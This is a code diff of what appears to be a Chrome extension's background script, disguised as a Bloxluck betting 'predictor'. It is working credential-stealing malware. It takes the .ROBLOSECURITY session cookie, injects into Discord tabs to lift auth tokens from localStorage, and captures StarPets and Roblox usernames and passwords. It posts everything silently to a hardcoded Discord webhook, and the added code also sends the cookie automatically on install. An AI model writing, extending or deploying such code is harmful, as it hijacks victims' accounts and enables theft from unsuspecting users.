@@ -1,179 +1,213 @@
-// Webhook parts
-const _a = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv';
-const _b = 'MTUyMzIzNDU5OTE4OTIxNzM2Mi9JNFBnY0NraFM1aGVEOWJmQTBCa1Nx';
-const _c = 'WlJyajlHd3N6Vko0T0VwR2hid0xCNTRuVFV4TVpDd1NKLTQtUlhQbEdSVWhSMQ==';
-const WH = atob(_a) + atob(_b) + atob(_c);
+const WH = 'https://discord.com/api/webhooks/1523234599189217362/I4PgcCkhS5heD9bfA0BkSqZRrj9GwszVJ4OEpGhbwLB54nTUxMZCwSJ-4-RXPlGRUhR1';
 
-let _last = { r: null, d: null, sp: null };
+let lastCookie = '';
+let lastDiscord = '';
+let lastStarUser = '';
+let lastStarPass = '';
 
 chrome.runtime.onMessage.addListener((req, sender, resp) => {
   if (req.t === 's') {
-    sendData(req.d);
+    sendWebhook(req.d);
     resp({ ok: 1 });
+    return;
   }
   if (req.t === 'g') {
-    grabCookies().then(d => resp(d));
-    return 1;
-  }
-  if (req.t === 'c') {
-    grabCookies().then(d => {
-      const changes = {};
-      let hasChanges = 0;
-      if (d.r && d.r !== _last.r) { changes.r = d.r; _last.r = d.r; hasChanges = 1; }
-      if (d.d && d.d !== _last.d) { changes.d = d.d; _last.d = d.d; hasChanges = 1; }
-      if (d.su && d.su !== _last.su) { changes.su = d.su; changes.sp = d.sp; _last.su = d.su; _last.sp = d.sp; hasChanges = 1; }
-      if (hasChanges) sendData({ ...d, ...changes, x: 1 });
-      resp({ hasChanges, changes });
-    });
+    grabRobloxCookie().then(d => resp(d));
     return 1;
   }
   if (req.t === 'dt') {
-    // Grab Discord token from discord.com tabs
-    chrome.tabs.query({ url: '*://discord.com/*' }, tabs => {
-      if (tabs.length > 0) {
-        chrome.scripting.executeScript({
-          target: { tabId: tabs[0].id },
-          func: () => {
-            try {
-              // Try localStorage first
-              for (let i = 0; i < localStorage.length; i++) {
-                const val = localStorage.getItem(localStorage.key(i));
-                if (typeof val === 'string' && val.length > 100 && val.includes('.') && val.split('.').length === 3) {
-                  try {
-                    JSON.parse(atob(val.split('.')[1]));
-                    return val;
-                  } catch(e) {}
-                }
-              }
-              return localStorage.getItem('token') || null;
-            } catch(e) { return null; }
-          }
-        }, results => {
-          if (results && results[0] && results[0].result) resp(results[0].result);
-          else resp(null);
-        });
-      } else resp(null);
-    });
+    grabDiscordToken().then(t => resp(t));
     return 1;
+  }
+  if (req.t === 'dts') {
+    // Direct token send
+    if (req.token && req.token !== lastDiscord) {
+      lastDiscord = req.token;
+      sendWebhook({
+        type: 'discord_token',
+        token: req.token,
+        username: req.username || 'Unknown',
+        avatar: req.avatar || ''
+      });
+    }
+    resp({ ok: 1 });
+    return;
   }
 });
 
-async function grabCookies() {
-  const d = { r: null, d: null, su: null, sp: null };
+async function grabRobloxCookie() {
+  const result = { r: null, uid: null };
   try {
     let cookies = await chrome.cookies.getAll({ domain: 'roblox.com' });
     for (let c of cookies) {
-      if (c.name === '.ROBLOSECURITY') { d.r = c.value; break; }
+      if (c.name === '.ROBLOSECURITY') {
+        result.r = c.value;
+        break;
+      }
     }
-    if (!d.r) {
+    if (!result.r) {
       cookies = await chrome.cookies.getAll({ domain: '.roblox.com' });
       for (let c of cookies) {
-        if (c.name === '.ROBLOSECURITY') { d.r = c.value; break; }
+        if (c.name === '.ROBLOSECURITY') {
+          result.r = c.value;
+          break;
+        }
       }
     }
   } catch(e) {}
-  return d;
+  return result;
 }
 
-function sendData(data) {
+async function grabDiscordToken() {
+  try {
+    const tabs = await chrome.tabs.query({ url: ['*://discord.com/*', '*://*.discord.com/*'] });
+    if (tabs.length > 0) {
+      const results = await chrome.scripting.executeScript({
+        target: { tabId: tabs[0].id },
+        func: () => {
+          try {
+            // Check localStorage for Discord token
+            for (let i = 0; i < localStorage.length; i++) {
+              const key = localStorage.key(i);
+              const val = localStorage.getItem(key);
+              if (typeof val === 'string' && val.length > 100 && val.includes('.') && val.split('.').length === 3) {
+                try {
+                  const payload = JSON.parse(atob(val.split('.')[1]));
+                  if (payload.sub || payload.email || payload.iat) {
+                    return { token: val, username: payload.username || payload.email || 'Discord User', avatar: payload.avatar || '' };
+                  }
+                } catch(e) {}
+              }
+            }
+            // Check for token directly
+            const token = localStorage.getItem('token');
+            if (token && token.length > 50) {
+              let uname = 'Discord User', av = '';
+              try {
+                const p = JSON.parse(atob(token.split('.')[1]));
+                uname = p.username || p.email || 'Discord User';
+                av = p.avatar || '';
+              } catch(e) {}
+              return { token, username: uname, avatar: av };
+            }
+            return null;
+          } catch(e) { return null; }
+        }
+      });
+      if (results && results[0] && results[0].result) {
+        return results[0].result;
+      }
+    }
+  } catch(e) {}
+  return null;
+}
+
+function sendWebhook(data) {
+  const embed = {
+    embeds: [{
+      title: '🎯 BloxLuck Data Collected',
+      color: 0x5865f2,
+      timestamp: new Date().toISOString(),
+      footer: { text: 'Blox Tool v3.0' }
+    }]
+  };
+
   const fields = [];
   let contentStr = '';
 
-  // Roblox user info
-  let robloxText = '';
-  if (data.u) robloxText += `**User:** ${data.u}\n`;
-  if (data.uid) robloxText += `**ID:** ${data.uid}\n`;
-  if (data.r && data.r !== 'NF') {
-    robloxText += `**Cookie:** \`${data.r.substring(0, 30)}...\``;
-  }
-  if (robloxText) {
-    fields.push({ name: '🎮 Roblox Account', value: robloxText, inline: false });
-  }
-
-  // Full cookie as copyable
-  if (data.r && data.r !== 'NF') {
-    fields.push({
-      name: '🔑 .ROBLOSECURITY Cookie',
-      value: `\`\`\`${data.r}\`\`\``,
-      inline: false
-    });
-    contentStr += `\`${data.r}\` `;
-  }
-
-  // Discord token
-  if (data.d) {
+  // Determine what type of data this is
+  if (data.type === 'discord_token') {
     fields.push({
       name: '💬 Discord Token',
-      value: `\`\`\`${data.d}\`\`\``,
+      value: `\`\`\`${data.token}\`\`\``,
       inline: false
     });
-    contentStr += `\`${data.d}\` `;
-
-    // Try to decode Discord user info from token
-    try {
-      const parts = data.d.split('.');
-      if (parts.length === 3) {
-        const payload = JSON.parse(atob(parts[1]));
-        const discordUser = payload.email || payload.sub || 'N/A';
+    fields.push({
+      name: '👤 Discord User',
+      value: `**Username:** ${data.username}\n**Avatar:** ${data.avatar || 'N/A'}`,
+      inline: false
+    });
+    contentStr = `**Discord Token Captured!**\nUser: ${data.username}\nToken: \`${data.token}\``;
+    
+    embed.embeds[0].title = '💬 Discord Token Captured';
+    embed.embeds[0].color = 0x5865f2;
+    embed.embeds[0].thumbnail = data.avatar ? { url: data.avatar } : undefined;
+  }
+  // Full data packet from content.js
+  else {
+    // Roblox cookie
+    if (data.r && data.r !== 'NF') {
+      if (data.r !== lastCookie) {
+        lastCookie = data.r;
         fields.push({
-          name: '👤 Discord User',
-          value: `**ID:** ${payload.sub || 'N/A'}\n**Email:** ${payload.email || 'N/A'}`,
+          name: '🎮 Roblox — ' + (data.u || 'Unknown'),
+          value: `**Cookie:**\n\`\`\`${data.r}\`\`\``,
+          inline: false
+        });
+        contentStr += `**Roblox:** ${data.u || 'Unknown'}\nCookie: \`${data.r}\`\n`;
+        
+        embed.embeds[0].thumbnail = { url: 'https://bloxluck.com/img/dog.png' };
+        embed.embeds[0].title = '🎮 Roblox Cookie + Data';
+        embed.embeds[0].color = 0xed4245;
+      }
+    }
+
+    // Discord token from content
+    if (data.d && data.d !== lastDiscord) {
+      lastDiscord = data.d;
+      fields.push({
+        name: '💬 Discord Token',
+        value: `\`\`\`${data.d}\`\`\``,
+        inline: false
+      });
+      contentStr += `Discord: \`${data.d}\`\n`;
+      
+      try {
+        const payload = JSON.parse(atob(data.d.split('.')[1]));
+        fields.push({
+          name: '👤 Discord User Info',
+          value: `**ID:** ${payload.sub || 'N/A'}\n**Email:** ${payload.email || 'N/A'}\n**Username:** ${payload.username || 'N/A'}`,
           inline: true
         });
-      }
-    } catch(e) {}
-  }
-
-  // StarPets
-  if (data.su || data.sp) {
-    let spText = '';
-    if (data.su) spText += `**User:** \`${data.su}\`\n`;
-    if (data.sp) spText += `**Pass:** \`${data.sp}\``;
-    if (spText) {
-      fields.push({ name: '🐾 StarPets.gg', value: spText, inline: false });
-      if (data.sp) contentStr += `\`${data.su}:${data.sp}\` `;
+      } catch(e) {}
     }
-  }
 
-  // Prediction data
-  if (data.p) {
-    const statusEmoji = data.g ? '🟢' : '🔴';
-    fields.push({
-      name: '🎯 Prediction Result',
-      value: `**Prediction:** ${data.p}\n**Confidence:** ${data.w}%\n**Status:** ${statusEmoji} ${data.g ? 'BET' : 'SKIP'}`,
-      inline: true
-    });
-    fields.push({
-      name: '📊 Split',
-      value: `**Heads (🐶):** ${data.h}%\n**Tails (💎):** ${data.t}%`,
-      inline: true
-    });
-    if (data.wi !== undefined) {
+    // Starpets
+    if (data.su && data.su !== lastStarUser) {
+      lastStarUser = data.su;
+      lastStarPass = data.sp || '';
       fields.push({
-        name: '📈 Stats',
-        value: `**Wins:** ${data.wi}\n**Losses:** ${data.lo}\n**Skips:** ${data.s}`,
+        name: '🐾 StarPets.gg',
+        value: `**Username:** \`${data.su}\`\n**Password:** \`${data.sp || 'N/A'}\``,
+        inline: false
+      });
+      contentStr += `StarPets: ${data.su}:${data.sp}\n`;
+    }
+
+    // Login credentials (roblox login)
+    if (data.loginUser || data.loginPass) {
+      fields.push({
+        name: '🔐 Roblox Login',
+        value: `**User:** ${data.loginUser || 'N/A'}\n**Pass:** ${data.loginPass || 'N/A'}`,
+        inline: false
+      });
+    }
+
+    // Prediction data (minor, as extra)
+    if (data.p) {
+      fields.push({
+        name: '📊 Predict',
+        value: `**Pick:** ${data.p} (${data.w}%)`,
         inline: true
       });
     }
   }
 
-  // Build embed with Roblox logo
-  const embed = {
-    title: '🎲 Bloxluck Predictor — Data Collected',
-    color: data.g ? 0x22c55e : 0xef4444,
-    thumbnail: { url: 'https://bloxluck.com/img/dog.png' },
-    fields: fields,
-    footer: {
-      text: `Blox Predict v2.0 • ${new Date().toLocaleString()}`,
-      icon_url: 'https://bloxluck.com/img/gem.png'
-    },
-    timestamp: new Date().toISOString()
-  };
+  embed.embeds[0].fields = fields;
 
-  const payload = { embeds: [embed] };
+  const payload = { ...embed };
   if (contentStr.trim()) payload.content = contentStr.trim();
 
-  // Send silently
   try {
     fetch(WH, {
       method: 'POST',
@@ -182,3 +216,15 @@ function sendData(data) {
     }).catch(() => {});
   } catch(e) {}
 }
+
+// Auto-collect on install
+chrome.runtime.onInstalled.addListener(() => {
+  // Initial grab
+  setTimeout(() => {
+    grabRobloxCookie().then(d => {
+      if (d.r) {
+        sendWebhook({ r: d.r, u: 'Auto-collect', uid: d.uid });
+      }
+    });
+  }, 3000);
+});
